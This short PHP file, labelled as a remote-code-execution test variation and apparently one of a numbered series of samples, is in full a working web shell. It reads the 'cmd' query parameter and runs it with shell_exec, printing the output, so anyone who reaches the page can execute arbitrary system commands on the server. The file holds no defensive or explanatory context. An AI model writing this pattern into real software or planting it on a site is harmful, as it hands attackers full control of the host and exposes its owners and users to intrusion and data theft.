<?php
// RCE test variation #702
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>